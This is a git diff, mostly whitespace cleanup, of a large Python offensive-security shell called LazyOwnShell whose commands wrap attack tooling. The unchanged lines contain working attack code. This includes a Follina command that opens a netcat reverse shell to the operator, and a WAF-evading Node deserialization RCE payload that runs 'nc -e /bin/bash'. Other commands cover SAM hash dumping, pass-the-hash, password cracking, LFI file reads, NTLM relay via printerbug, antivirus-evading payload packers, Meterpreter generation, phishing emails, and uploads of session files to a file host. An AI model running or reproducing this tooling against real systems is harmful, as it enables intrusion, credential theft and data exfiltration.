             except FileNotFoundError:
                 print_error(f"Error: {json_file} not found")
             except KeyError as e:
@@ -17762,7 +17764,7 @@ class LazyOwnShell(cmd2.Cmd):
         Converts shellcode to SYLK format and saves the result to a file.
 
         This function reads the provided shellcode, or retrieves it from a default
-        binary source if not supplied. The shellcode is then converted to SYLK 
+        binary source if not supplied. The shellcode is then converted to SYLK
         format and saved in the `sessions/shellcode.sylk` file.
 
         PoC Python code to create a SYLK file with Excel4 shellcode loader.
@@ -17775,15 +17777,15 @@ class LazyOwnShell(cmd2.Cmd):
         Background details: https://outflank.nl/blog/2019/10/30/abusing-the-sylk-file-format/
 
         Args:
-            line (str): The input shellcode string. If empty or None, the function 
+            line (str): The input shellcode string. If empty or None, the function
                         attempts to load shellcode from a predefined source.
 
         Returns:
-            None: The function writes the SYLK shellcode to a file and prints it 
+            None: The function writes the SYLK shellcode to a file and prints it
             out, but does not return any value.
 
         Raises:
-            FileNotFoundError: If no shellcode is found when trying to load it from 
+            FileNotFoundError: If no shellcode is found when trying to load it from
                             the default source.
         """
         shellcode_file = 'sessions/shellcode.sylk'
@@ -17824,7 +17826,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         magicrecon_repo = "https://github.com/robotshell/magicRecon.git"
         magicrecon_dir = os.path.join(os.getcwd(), "external/.exploit/magicRecon")
-        
+
         url = self.params["url"]
         url = get_domain(url)
 
@@ -17848,7 +17850,7 @@ class LazyOwnShell(cmd2.Cmd):
                 notify = "-n"
             else:
                 notify = ""
-            
+
             cmd = f"cd sessions && {magicrecon_dir}/magicrecon.sh -d {target} {mode} {notify}"
         else:
             cmd = f"cd sessions && {magicrecon_dir}/magicrecon.sh {' '.join(args)}"
@@ -17939,7 +17941,7 @@ class LazyOwnShell(cmd2.Cmd):
             print_warn("samdump2 is not installed. Installing dependencies.")
             self.cmd("apt-get install samdump2 -y")
 
-        
+
         if os.path.exists("sessions/SYSTEM"):
             output_file =  f"sessions/samdump_{rhost}.txt"
             command = f"samdump2 sessions/SYSTEM sessions/SAM -o {output_file}"
@@ -17950,7 +17952,7 @@ class LazyOwnShell(cmd2.Cmd):
             return
         else:
             print_error("You need credentials.txt or SAM and SYSTEM files")
-    
+
         return
 
     @cmd2.with_category(lateral_movement_category)
@@ -17998,7 +18000,7 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(f"Running Storm-Breaker: {command} you can run:{GREEN} ngrok 2525{RESET}")
         self.cmd(command)
         return
-    
+
     @cmd2.with_category(exploitation_category)
     def do_upload_bypass(self, line):
         """
@@ -18078,13 +18080,13 @@ class LazyOwnShell(cmd2.Cmd):
         if not line:
             line = "request.txt"
         line = line.strip()
-        file_request = f"sessions/{line}" 
-        
+        file_request = f"sessions/{line}"
+
         self.cmd(f"nano {file_request}")
-        
+
         with open(file_request, 'r') as file:
             hex_data = file.read()
-        
+
         lines = hex_data.splitlines()
         hex_values = []
 
@@ -18094,15 +18096,15 @@ class LazyOwnShell(cmd2.Cmd):
         hex_values = [byte for byte in hex_values if len(byte) == 2]
 
         plaintext = ''.join(chr(int(byte, 16)) for byte in hex_values if all(c in '0123456789abcdefABCDEF' for c in byte))
-       
+
         print_msg("Plain text:")
         file_plain = "sessions/request_plaintext.txt"
         with open(file_plain, 'w') as plain:
             plain.write(plaintext)
-        
+
         print_msg(plaintext)
         return
-    
+
     @cmd2.with_category(scanning_category)
     def do_rpcmap_py(self, line):
         """
@@ -18125,7 +18127,7 @@ class LazyOwnShell(cmd2.Cmd):
         """
         path = os.getcwd()
         rhost = self.params["rhost"]
-        
+
         if not is_binary_present("rpcmap.py"):
             print_warn("rpcmap.py not found installing...")
             self.cmd("sudo apt install impacket -y")
@@ -18143,10 +18145,10 @@ class LazyOwnShell(cmd2.Cmd):
                 print_msg(f"Try... {command}")
                 self.cmd(command)
 
-        
+
         print_msg(f"Running RPCMap command: {command}")
         return
-    
+
     @cmd2.with_category(recon_category)
     def do_serveralive2(self, line):
         """
@@ -18166,16 +18168,16 @@ class LazyOwnShell(cmd2.Cmd):
         Example:
             serveralive2
         """
-        
+
         target = f"ncacn_ip_tcp:{self.params['rhost']}"
         rpcTransport = transport.DCERPCTransportFactory(target)
         portmap = rpcTransport.get_dce_rpc()
         portmap.set_auth_level(RPC_C_AUTHN_LEVEL_NONE)
         portmap.connect()
-        
+
         obj = IObjectExporter(portmap)
         bindings = obj.ServerAlive2()
-        
+
         for binding in bindings:
             addr = binding['aNetworkAddr']
             print_msg(f"Address: {addr}")
@@ -18184,14 +18186,14 @@ class LazyOwnShell(cmd2.Cmd):
     @cmd2.with_category(credential_access_category)
     def do_john2zip(self, line):
         """
-        List all .zip files in the 'sessions' directory, let the user select one, and run the command 
-        `zip2john {selected_file} > sessions/hash.txt`. 
+        List all .zip files in the 'sessions' directory, let the user select one, and run the command
+        `zip2john {selected_file} > sessions/hash.txt`.
         Then, run John the Ripper to crack the hash using the RockYou wordlist with multiple forks.
-        
+
         Parameters:
-        line (str): An optional string parameter. This can be used for any additional input, though 
+        line (str): An optional string parameter. This can be used for any additional input, though
                     it's not needed in this specific command.
-        
+
         Returns:
         None
         """
@@ -18219,7 +18221,7 @@ class LazyOwnShell(cmd2.Cmd):
             backup_hash_file = os.path.join(sessions_dir, f"hash_{timestamp}.txt")
             os.rename(hash_file_path, backup_hash_file)
             print_warn(f"Existing hash.txt file backed up as: {backup_hash_file}")
-        
+
         command = f"sudo zip2john {selected_file_path} > {hash_file_path}"
         try:
             print_msg(command)
@@ -18247,14 +18249,14 @@ class LazyOwnShell(cmd2.Cmd):
         """
         Command createusers_and_hashs: Extracts usernames and hashes from a dump file.
 
-        This function opens a nano editor for the user to input the contents of a 
+        This function opens a nano editor for the user to input the contents of a
         file in the format:
-        
+
             username:UID:LM_HASH:NT_HASH:::
-        
+
         Once the data is entered and saved, the function generates:
         1. A file named `usernames_{rhost}.txt` containing all usernames.
-        2. Individual files named `hash_{username}.txt` for each user, containing 
+        2. Individual files named `hash_{username}.txt` for each user, containing
         the user's LM and NT hash in the format `LM_HASH:NT_HASH`.
 
         Args:
@@ -18379,11 +18381,11 @@ class LazyOwnShell(cmd2.Cmd):
         key_name = input("Enter registry key (e.g., HKU\\\\Software): ") or 'HKU\\\\Software'
 
         command = f"reg.py -hashes {hash_value} {domain}/{username}@{subdomain} query -keyName {key_name}"
-        
+
         print_msg(f"Executing command: {command}")
         self.cmd(command)
         command = f"impacket-reg -hashes {hash_value} {domain}/{username}@{subdomain} query -keyName {key_name}"
-        
+
         print_msg(f"Executing command: {command}")
         self.cmd(command)
 
@@ -18408,7 +18410,7 @@ class LazyOwnShell(cmd2.Cmd):
             print_warn("nth is not installed. Installing.")
             self.cmd("pip3 install nth")
             return
-        
+
         hash_file_path = 'sessions/hash.txt'
 
         if not os.path.exists(hash_file_path):
@@ -18417,12 +18419,12 @@ class LazyOwnShell(cmd2.Cmd):
 
         hash_value = get_hash()
         command = f"nth -t \"{hash_value}\""
-        
+
         print_msg(f"Executing command: {command}")
         self.cmd(command)
 
         return
-    
+
     @cmd2.with_category(credential_access_category)
     def do_refill_password(self, line):
         """Generate a list of possible passwords by filling each asterisk in the input with user-specified characters.
@@ -18449,7 +18451,7 @@ class LazyOwnShell(cmd2.Cmd):
         characters = input("    [!] Enter characters to replace '*': (default: 0123456789) ") or '0123456789'
         password_base = list(line)
         asterisk_positions = [i for i, char in enumerate(password_base) if char == '*']
-        
+
         combinations = itertools.product(characters, repeat=len(asterisk_positions))
         with open(output_file, "w") as f:
             for combo in combinations:
@@ -18527,7 +18529,7 @@ class LazyOwnShell(cmd2.Cmd):
             if ":" in hash_value:
                 hashis = f"-hashes {hash_value}"
             else:
-                hashis = f"-hashes :{hash_value}"                
+                hashis = f"-hashes :{hash_value}"
             user = input("    [!] Enter Username (default: Administrator): ") or 'Administrator'
             command = f"impacket-netview -user {user} -target {domain} -dc-ip {rhost} {hashis} {domain}/{user}"
             print_msg(command)
@@ -18603,7 +18605,7 @@ class LazyOwnShell(cmd2.Cmd):
         else:
             print_error("Incorrect usage. Use 'pass' to authenticate with credentials or 'hash' to use a hash.")
             return
-        
+
     @cmd2.with_category(reporting_category)
     def do_extract_ports(self, line):
         """
@@ -18611,7 +18613,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         This function performs the following actions:
         1. Reads the specified file to find open ports.
-        2. If not port pass as an argument, Extracts the first unique IP address found in the file. 
+        2. If not port pass as an argument, Extracts the first unique IP address found in the file.
         3. Prints the extracted information to the console.
 
         Parameters:
@@ -18621,7 +18623,7 @@ class LazyOwnShell(cmd2.Cmd):
         None
         """
         path = os.getcwd()
-        
+
         file = f"{path}/puertos"
         if not os.path.isfile(file):
             print_error(f"File not found: {file}")
@@ -18667,7 +18669,7 @@ class LazyOwnShell(cmd2.Cmd):
             if banner and banner not in ("No banner received (timed out)", "Connection reset by peer - no banner available"):
                 print_msg(banner)
                 self.onecmd(f"ss {banner}")
-            else: 
+            else:
                 print_warn(f"Port: {p} return: {banner}")
         return
 
@@ -18677,7 +18679,7 @@ class LazyOwnShell(cmd2.Cmd):
         Schedules a command to run at a specified time.
 
         This function allows users to schedule a command to execute at a specific hour and minute.
-        If the specified time has already passed for the current day, the command will be scheduled 
+        If the specified time has already passed for the current day, the command will be scheduled
         to run the following day.
 
         Usage:
@@ -18716,7 +18718,7 @@ class LazyOwnShell(cmd2.Cmd):
         except ValueError:
             print_error("Invalid format. Use cron HH:MM command [optional args]")
         return
-    
+
     @cmd2.with_category(post_exploitation_category)
     def do_pezorsh(self, line):
         """
@@ -18724,7 +18726,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         This function enables the user to construct commands for PEzor with various options.
         By default, parameters are prompted to ensure successful execution without failure due to
-        missing values. It supports both executable and shellcode packing with the ability to 
+        missing values. It supports both executable and shellcode packing with the ability to
         select from a range of PEzor flags to create the desired payload.
 
         Functionalities of the function include:
@@ -18744,7 +18746,7 @@ class LazyOwnShell(cmd2.Cmd):
         """
         pezor_git = "https://github.com/phra/PEzor.git"
         pezor_dir = os.path.join(os.getcwd(), "external/.exploit/PEzor")
-        
+
         if not os.path.exists(pezor_dir):
             print_msg("Cloning PEzor repository...")
             self.cmd(f"git clone {pezor_git} {pezor_dir}")
@@ -18752,11 +18754,11 @@ class LazyOwnShell(cmd2.Cmd):
             self.cmd(f"cd {pezor_dir} && chmod +x {pezor_dir}/install.sh && {pezor_dir}/install.sh")
         else:
             print_msg("PEzor already installed, skipping setup.")
-       
+
         executable_path = input("Enter path to the executable or shellcode file: ") or "sessions/shellcode.bin"
         pack_type = input("Specify 'exec' for executable or 'shellcode' for shellcode (default: exec): ") or "exec"
         options = []
-   
+
         if pack_type == "exec":
             options.append(input("Enter any donut args (e.g., '-z 2'): ") or "")
         options.append("-32" if input("Force 32-bit executable? (y/n, default: n): ").lower() == "y" else "-64")
@@ -18783,7 +18785,7 @@ class LazyOwnShell(cmd2.Cmd):
         xorkey = input("Specify XOR key (optional): ")
         if xorkey:
             options.append(f"-xorkey={xorkey}")
-        
+
         command = f"{pezor_dir}/PEzor.sh {executable_path} {' '.join(options)}"
         print_msg(f"Generated command: {command}")
         self.cmd(command)
@@ -18824,7 +18826,7 @@ class LazyOwnShell(cmd2.Cmd):
                 print_error("Need credentials to use this options. use: createcredentials admin:admin")
                 return
             credentials = get_credentials()
-            
+
             if not credentials:
                 return
             for user, passwd in credentials:
@@ -18920,7 +18922,7 @@ class LazyOwnShell(cmd2.Cmd):
         else:
             print_error("Incorrect usage. Use 'pass' to authenticate with credentials or 'hash' to use a hash.")
             return
-        
+
     @cmd2.with_category(scanning_category)
     def do_mqtt_check_py(self, line):
         """
@@ -18976,7 +18978,7 @@ class LazyOwnShell(cmd2.Cmd):
         else:
             print_error("Incorrect usage. Use 'pass' to authenticate with credentials or 'ssl' to enable SSL.")
             return
-    
+
     @cmd2.with_category(scanning_category)
     def do_lookupsid_py(self, line):
         """
@@ -19058,7 +19060,7 @@ class LazyOwnShell(cmd2.Cmd):
         1. Checks if Scavenger is installed; if not, it clones the repository and installs dependencies.
         2. If the line argument is "pass", it searches for credential files matching `credentials*.txt`,
            prompts the user to select one, and executes Scavenger using the chosen credentials on a single target IP.
-        3. If the line argument is "targets", it prompts for an IP list file (`iplist`) and uses Scavenger with 
+        3. If the line argument is "targets", it prompts for an IP list file (`iplist`) and uses Scavenger with
            credentials from a selected file on multiple target IPs with the `--overwrite` option.
         4. If line does not match "pass" or "targets", it displays an error message with usage instructions.
 
@@ -19116,7 +19118,7 @@ class LazyOwnShell(cmd2.Cmd):
             print_error("Incorrect usage. Use 'pass' for single target or 'targets' with an IP list.")
             return
 
-    @cmd2.with_category(recon_category)  
+    @cmd2.with_category(recon_category)
     def do_binarycheck(self, line):
         """
         Performs various checks on a selected binary to gather information and protections.
@@ -19135,7 +19137,7 @@ class LazyOwnShell(cmd2.Cmd):
         Returns:
         None
         """
-        
+
         binaries_list = list_binaries()
         if not binaries_list:
             print_error("No binaries found in the specified directory.")
@@ -19156,7 +19158,7 @@ class LazyOwnShell(cmd2.Cmd):
         self.cmd(f"objdump -s {selected_binary} | grep 'GNU'")
 
         print_msg(f"Generating padding using pwntools for {selected_binary}...")
-        
+
 
         print_msg(f"Listing gadgets for {selected_binary}...")
         self.cmd(f"env/bin/ROPgadget --binary {selected_binary}")
@@ -19256,7 +19258,7 @@ class LazyOwnShell(cmd2.Cmd):
             self.cmd(command)
 
         elif line.startswith("acount"):
-            
+
             account = input("    [!] Enter Account for account abuse (default CA_SVC): ") or 'CA_SVC'
             command = f"certipy-ad account -u '{user}@{domain}' -p '{passwd}' -dc-ip '{target}' -user '{account}' read"
             self.cmd(command)
@@ -19275,7 +19277,7 @@ class LazyOwnShell(cmd2.Cmd):
         else:
             print_error("Enter valid option shadow or vuln")
             return
-        return            
+        return
     @cmd2.with_category(scanning_category)
     def do_certipy(self, line):
         """
@@ -19413,7 +19415,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         else:
             print_msg("Follina already installed, skipping setup.")
-        
+
         with open(index, 'w+') as f:
             f.write(html)
         self.cmd("cp sessions/index.html /tmp")
@@ -19434,7 +19436,7 @@ class LazyOwnShell(cmd2.Cmd):
         elif line == "reverse":
             port = input(f"    [!] Enter port for reverse shell (default: {lport}): ") or lport
             input(f"    {YELLOW}[!] Get a reverse shell on port {lport}. Note, this downloads a netcat binary onto the victim and places it in C:\Windows\Tasks. It does not clean up the binary. This will trigger antivirus detections unless AV is disabled. Press enter when exist:{RESET} ")
-            
+
             command = f"cd {follina_dir} && python3 {follina_dir}/follina.py  --interface  {device} --port {web_port}  -c 'nc.exe -e cmd.exe {self.params['rhost']} {port}'"
             print_msg(f"Executing command: {command}")
             self.cmd(command)
@@ -19473,10 +19475,10 @@ class LazyOwnShell(cmd2.Cmd):
             self.cmd(f"git clone {swaks_git} {swaks_dir}")
         else:
             print_msg("Swaks already installed, skipping setup.")
-        
+
         server = domain
         body = line or f"http://{lhost}/"
-        
+
         command = f"{swaks_dir}/swaks --to {email_to} --from {email_from} --server {server} --body \"{body}\""
         print_msg(f"Executing command: {command}")
         self.cmd(command)
@@ -19484,13 +19486,13 @@ class LazyOwnShell(cmd2.Cmd):
     @cmd2.with_category(scanning_category)
     def do_ad_ldap_enum(self, line):
         """
-        Executes ad-ldap-enum to enumerate Active Directory objects (users, groups, computers) 
+        Executes ad-ldap-enum to enumerate Active Directory objects (users, groups, computers)
         through LDAP, collecting extended information on group memberships and additional AD details.
 
-        This function enables the enumeration of Active Directory users, groups, and computers 
-        by executing LDAP queries on a specified domain controller. The command constructed allows 
-        password or Pass-the-Hash authentication, supports SSL/TLS, and IPv4/IPv6 connections, 
-        and outputs data into CSV files detailing domain group memberships and extended user/computer 
+        This function enables the enumeration of Active Directory users, groups, and computers
+        by executing LDAP queries on a specified domain controller. The command constructed allows
+        password or Pass-the-Hash authentication, supports SSL/TLS, and IPv4/IPv6 connections,
+        and outputs data into CSV files detailing domain group memberships and extended user/computer
         information.
 
         Functionalities include:
@@ -19543,7 +19545,7 @@ class LazyOwnShell(cmd2.Cmd):
         This function attempts to locate and unzip a file in the sessions directory.
         If a filename is provided as `line`, it will use that; otherwise, it will attempt
         to retrieve a zip file name based on existing zip files in the user's dictionary.
-        If the zip file is not found or does not exist in the sessions path, it prints 
+        If the zip file is not found or does not exist in the sessions path, it prints
         an error message.
 
         Steps of execution:
@@ -19554,7 +19556,7 @@ class LazyOwnShell(cmd2.Cmd):
         Usage example:
             unzip filename.zip
 
-        :param line: The zip filename to be extracted. If empty, a zip file will be selected 
+        :param line: The zip filename to be extracted. If empty, a zip file will be selected
                     automatically if available.
         :return: None
         """
@@ -19587,9 +19589,9 @@ class LazyOwnShell(cmd2.Cmd):
 
         Parameters:
         line (str): Command argument specifying the parameters for the reGeorg execution.
-                    - The expected format is: "<port> <url>", where <port> is the listening port and <url> is the URL 
+                    - The expected format is: "<port> <url>", where <port> is the listening port and <url> is the URL
                     containing the tunnel script.
-        
+
         Returns:
         None
         """
@@ -19640,7 +19642,7 @@ class LazyOwnShell(cmd2.Cmd):
                     If not provided, the function prompts the user for input.
         :type line: str
         :raises ValueError: If the provided length is not a valid positive integer.
-        
+
         Example:
             do_rocky('8')
             # Executes: grep '^.\{8\}$' /usr/share/wordlists/rockyou.txt > sessions/lazypass_mini_rocky.txt
@@ -19649,11 +19651,11 @@ class LazyOwnShell(cmd2.Cmd):
 
         if not line:
             line = input("    [!] Enter the lenght of the passwords to reduce your wordlist(default 4): ") or '4'
-        
+
         if not line.isdigit() or int(line) <= 0:
             print_error("Length must be a positive integer.")
             return
-    
+
         command = "grep '^.\{" + str(line) + "\}$' " + wordlist + " > sessions/lazypass_mini_rocky.txt"
         print_msg(command)
         self.cmd(command)
@@ -19665,7 +19667,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         This function performs the following actions:
         1. Checks if pyWhisker is installed; if not, it clones the repository.
-        2. Executes various actions on the msDS-KeyCredentialLink attribute, allowing actions like listing, adding, 
+        2. Executes various actions on the msDS-KeyCredentialLink attribute, allowing actions like listing, adding,
         spraying, removing, clearing, exporting, or importing KeyCredentials for a specified target user or computer.
 
         The command accepts different authentication options:
@@ -19866,7 +19868,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         rhost = self.params["rhost"]
         domain = self.params["domain"]
-  
+
         credentials_path = f"{os.getcwd()}/sessions/credentials.txt"
 
         if not os.path.exists(credentials_path):
@@ -19875,13 +19877,13 @@ class LazyOwnShell(cmd2.Cmd):
 
         credentials = get_credentials()
         pfx = get_users_dic("pfx")
-        
+
         if not credentials:
             return
-        
+
         if not pfx:
             return
-        
+
         for user, passwd in credentials:
             command = f"cd sessions && python3 {pkinit_path}/gettgtpkinit.py {domain}/{user} -cert-pfx {pfx} -pfx-pass {passwd} {user}.cache"
             print_msg(command)
@@ -19917,7 +19919,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         rhost = self.params["rhost"]
         domain = self.params["domain"]
-  
+
         credentials_path = f"{os.getcwd()}/sessions/credentials.txt"
 
         if not os.path.exists(credentials_path):
@@ -19925,10 +19927,10 @@ class LazyOwnShell(cmd2.Cmd):
             return
 
         credentials = get_credentials()
-        
+
         if not credentials:
             return
-        
+
         for user, passwd in credentials:
             command = f"cd sessions && export KRB5CCNAME={user}.cache && python3 {pkinit_path}/getnthash.py {domain}/{user} -key {passwd}"
             print_msg(command)
@@ -19964,7 +19966,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         rhost = self.params["rhost"]
         domain = self.params["domain"]
-  
+
         credentials_path = f"{os.getcwd()}/sessions/credentials.txt"
 
         if not os.path.exists(credentials_path):
@@ -19972,10 +19974,10 @@ class LazyOwnShell(cmd2.Cmd):
             return
 
         credentials = get_credentials()
-        
+
         if not credentials:
             return
-        
+
         for user, passwd in credentials:
             command = f"cd sessions && python3 {pkinit_path}/gets4uticket.py kerberos+ccache://{domain}\\{user}:{user}.cache@{rhost} cifs/{user}@{domain} {user}@{domain} {user}.cache -v"
             print_msg(command)
@@ -20006,12 +20008,12 @@ class LazyOwnShell(cmd2.Cmd):
             import aclpwn
         except ImportError:
             self.cmd("pip3 install aclpwn")
-        
+
         path = os.getcwd()
         aclpwn_command = "aclpwn"
 
 
-        
+
         domain = self.params["domain"]
         rhost = self.params["rhost"]
         target = input("    [!] Enter target name(default target): ") or 'target'
@@ -20019,7 +20021,7 @@ class LazyOwnShell(cmd2.Cmd):
         command = f"{aclpwn_command} -f {target} -ft {computer} -d {domain}"
         if rhost:
             command += f" --server {rhost} "
-        
+
         print_msg(f"Running dry validation: {command} -dry")
         self.cmd(f"{command} -dry")
 
@@ -20029,7 +20031,7 @@ class LazyOwnShell(cmd2.Cmd):
             self.cmd(command)
         else:
             print_warn("Exploitation aborted by user.")
-        
+
         return
 
     @cmd2.with_category(exploitation_category)
@@ -20159,7 +20161,7 @@ class LazyOwnShell(cmd2.Cmd):
             return
 
         for user, password in credentials:
-            
+
             target = input(f"    [!] Enter target username@host (e.g., '{domain}\\\\{user}@{rhost}'): ") or f'{domain}\\\\{user}@{rhost}'
             attacker = input(f"    [!] Enter attacker hostname or IP for RPC backconnect default {lhost}: ") or lhost
             printerbug_command = f"python3 {krbrelayx_path}/printerbug.py {target} {attacker}"
@@ -20291,17 +20293,17 @@ class LazyOwnShell(cmd2.Cmd):
             for file in files:
                 if not any(file.endswith(ext) for ext in excluded_extensions):
                     file_list.append(os.path.join(root, file))
-        
+
         if not file_list:
             print_error("No files found in the sessions directory.")
             return
-    
+
         print_msg("Select a file to Upload:")
         for idx, file in enumerate(file_list, 1):
             print_msg(f"  {idx}) {file}")
 
         file_choice = input(f"    [!] Enter the number of the file (1-{len(file_list)}): ").strip()
-        
+
         try:
             file_choice = int(file_choice)
             if file_choice < 1 or file_choice > len(file_list):
@@ -20311,24 +20313,24 @@ class LazyOwnShell(cmd2.Cmd):
         except ValueError:
             print_error("Invalid input. Please enter a number.")
             return
-        
+
         file_path = selected_file
-        
+
         if not os.path.isfile(file_path):
             print_error(f"File '{file_path}' does not exist.")
             return
 
         url = 'https://store1.gofile.io/contents/uploadfile'
-    
+
         files = {
             'file': open(file_path, 'rb')
         }
-        
+
         try:
             response = requests.post(url, files=files)
-            response.raise_for_status()  
-            data = response.json() 
-            
+            response.raise_for_status()
+            data = response.json()
+
             if data.get('status') == 'ok':
                 file_info = data['data']
                 print_msg("File uploaded successfully!")
@@ -20345,7 +20347,7 @@ class LazyOwnShell(cmd2.Cmd):
         except requests.exceptions.RequestException as e:
             print_error(f"An error occurred: {e}")
         finally:
-            files['file'].close()  
+            files['file'].close()
 
         return
     @cmd2.with_category(exploitation_category)
@@ -20357,16 +20359,16 @@ class LazyOwnShell(cmd2.Cmd):
         Some WAF can be bypassed with the use of unicode characters.
 
         Generate an obfuscated payload, encode it in base64, and append the SSH public key to the authorized_keys file.
-        
+
         Args:
             ip_address (str): The IP address for the reverse shell connection.
             port (int): The port for the reverse shell connection.
             ssh_public_key (str): The SSH public key to add to authorized_keys.
-        
+
         Returns:
             str: The base64-encoded obfuscated payload.
 
-        """    
+        """
         lhost = self.params["lhost"]
         lport = str(self.params["lport"])
         payload = '{"rce":"_$$ND_FUNC$$_function() {require(\'child_process\').exec(\'nc -e /bin/bash {lhost} {lport}\',function(error,stdout,stderr) {console.log (stdout) });\n}()"}'.replace('{lhost}',lhost).replace('{lport}',lport)
@@ -20401,7 +20403,7 @@ class LazyOwnShell(cmd2.Cmd):
         self.logcsv(f"unicode_WAFbypass {payload} {obfuscated_payload}")
         print_msg(obfuscated_payload)
 
-    @cmd2.with_category(exploitation_category)   
+    @cmd2.with_category(exploitation_category)
     def do_sqli_mssql_test(self, line):
         """
         Initiates a reverse MSSQL shell by starting an HTTP server to handle incoming connections and exfiltrate data.
@@ -20479,7 +20481,7 @@ class LazyOwnShell(cmd2.Cmd):
             if not credentials:
                 password = input(f"    [!] Enter password for {username}@{domain}: ").strip()
                 auth_param = f"-p '{password}'"
-            else:    
+            else:
                 for user, password in credentials:
                     auth_param = f"-p '{password}'"
         else:
@@ -20601,7 +20603,7 @@ class LazyOwnShell(cmd2.Cmd):
         lport = self.params["lport"]
         domain = self.params["domain"]
         subdomain = self.params["subdomain"]
-        
+
         cert_name = f"sessions/{subdomain}.{domain}"
         print_msg(f"Creating SSL certificate for {cert_name}")
         cert_command = (
@@ -20666,29 +20668,29 @@ class LazyOwnShell(cmd2.Cmd):
 
         print_msg("Paranoid Meterpreter payload and listener created successfully.")
         return
-    
+
     @cmd2.with_category(exploitation_category)
     def do_lfi(self, line):
         """
-        Exploits a potential Local File Inclusion (LFI) vulnerability by crafting 
+        Exploits a potential Local File Inclusion (LFI) vulnerability by crafting
         and sending HTTP GET requests to a specified URL.
 
-        The user can specify the target URL directly via the `line` parameter or 
-        provide it interactively. If no URL is provided, the method uses a default 
-        value stored in `self.params["url"]`. Users are then prompted to specify 
+        The user can specify the target URL directly via the `line` parameter or
+        provide it interactively. If no URL is provided, the method uses a default
+        value stored in `self.params["url"]`. Users are then prompted to specify
         the file to retrieve from the server, defaulting to `/etc/passwd`.
 
         Args:
-            line (str): Optional URL input provided directly in the command line. 
-                        If not supplied, a default URL from `self.params["url"]` 
+            line (str): Optional URL input provided directly in the command line.
+                        If not supplied, a default URL from `self.params["url"]`
                         will be used.
 
         Behavior:
-            - Continuously prompts the user to specify a file to fetch via the 
+            - Continuously prompts the user to specify a file to fetch via the
             target LFI vulnerability.
-            - Sends a GET request to the constructed URL and prints the server's 
+            - Sends a GET request to the constructed URL and prints the server's
             response to the console.
-            - Allows users to inspect different files on the target server by 
+            - Allows users to inspect different files on the target server by
             modifying the file path interactively.
         """
         url = self.params["url"]
@@ -20700,7 +20702,7 @@ class LazyOwnShell(cmd2.Cmd):
         for s in start:
             sys.stdout.write(s)
             sys.stdout.flush()
-            time.sleep(0.1)    
+            time.sleep(0.1)
         self.logcsv(f"lfi {url}")
         while True:
             file = input(f"   [!] Enter file (default /etc/passwd): ") or '/etc/passwd'
@@ -20708,7 +20710,7 @@ class LazyOwnShell(cmd2.Cmd):
             print_msg(url)
             r = requests.get(url)
             print_msg(r.text)
-    
+
     @cmd2.with_category(exploitation_category)
     def do_greatSCT(self, line):
         """
@@ -20781,7 +20783,7 @@ class LazyOwnShell(cmd2.Cmd):
         """
         rhost = self.params["rhost"]
         domain = self.params["domain"]
-        
+
         credentials_path = f"{os.getcwd()}/sessions/credentials.txt"
 
         if not os.path.exists(credentials_path):
@@ -20802,7 +20804,7 @@ class LazyOwnShell(cmd2.Cmd):
     @cmd2.with_category(persistence_category)
     def do_setoolKits(self, line):
         """
-        Executes the SEToolKit workflow to generate a Meterpreter payload 
+        Executes the SEToolKit workflow to generate a Meterpreter payload
         and configure the multi-handler using LHOST and LPORT from self.params.
 
         Usage:
@@ -20860,7 +20862,7 @@ class LazyOwnShell(cmd2.Cmd):
             print_msg("jwt_tool installation completed.")
 
         jwt_token = line.strip() if line else input("Enter the JWT token: ").strip()
-        
+
         jwt_tool_command = f"python3 {jwt_tool_path}/jwt_tool.py {jwt_token}"
 
         print_msg(f"Running jwt_tool with command: {jwt_tool_command}")
@@ -20918,7 +20920,7 @@ class LazyOwnShell(cmd2.Cmd):
         output_file = input(f"    [!] Enter output file name (default: 'sessions/legit.exe'): ") or f"{sessions}/legit.exe"
 
         darkarmour_command = f"cd {darkarmour_path} && python3 {darkarmour_path}/darkarmour.py -f {file_input} --encrypt {encryption_method} "
-        
+
         if shellcode_file:
             darkarmour_command += f"--shellcode {shellcode_file} "
         if is_binary.lower() == "y":
@@ -20941,21 +20943,21 @@ class LazyOwnShell(cmd2.Cmd):
         self.cmd(darkarmour_command)
         self.logcsv(f"darkarmour {darkarmour_command}")
         return
-    
+
     @cmd2.with_category(scanning_category)
     def do_osmedeus(self, line):
         """
         Executes Osmedeus scans with guided input for various scanning scenarios.
 
         This function performs the following actions:
-        1. Verifies the presence of Osmedeus; if not installed, it clones the repository 
+        1. Verifies the presence of Osmedeus; if not installed, it clones the repository
         and installs the required dependencies.
-        2. Guides the user through selecting the type of scan, target, and any additional 
+        2. Guides the user through selecting the type of scan, target, and any additional
         parameters needed for the scan.
         3. Constructs and executes the appropriate Osmedeus command.
 
         Parameters:
-        line (str): Command-line arguments for the tool. If not provided, interactive 
+        line (str): Command-line arguments for the tool. If not provided, interactive
                     input will be used.
 
         Returns:
@@ -21088,20 +21090,20 @@ class LazyOwnShell(cmd2.Cmd):
         self.logcsv(f"metabigor {command}")
         os.chdir(path)
         return
-    
+
     @cmd2.with_category(miscellaneous_category)
     def do_ip2asn(self, line):
         """Command to get ASN for a given IP address."""
         path = os.getcwd()
         file = f"{path}/sessions/ip2asn-v4.tsv.gz"
-        
+
         url = "https://github.com/pl-strflt/iptoasn/raw/main/data/ip2asn-v4.tsv.gz"
         if not os.path.exists(file):
             command = f"curl -o {file} {url}"
             self.cmd(command)
         self.ip2asn.open_file(file)
         rhost = self.params["rhost"]
-        
+
         if line:
             target = line.strip()
         else:
@@ -21316,7 +21318,7 @@ class LazyOwnShell(cmd2.Cmd):
         for file in yaml_files:
             with open(file, "r") as f:
                 data = yaml.safe_load(f)
-                
+
                 if "atomic_tests" in data:
                     for test in data["atomic_tests"]:
                         if test["auto_generated_guid"] == test_id:
@@ -21331,7 +21333,7 @@ class LazyOwnShell(cmd2.Cmd):
                                 "cleanup_command": test.get("executor", {}).get("cleanup_command", ""),
                                 "input_arguments": test.get("input_arguments", {}),
                                 "mitre_id": data.get("attack_technique", "No MITRE ID available")
-                                
+
                             }
                             break
             if selected_test:
@@ -21354,7 +21356,7 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(f"Executor: {selected_test['executor']}")
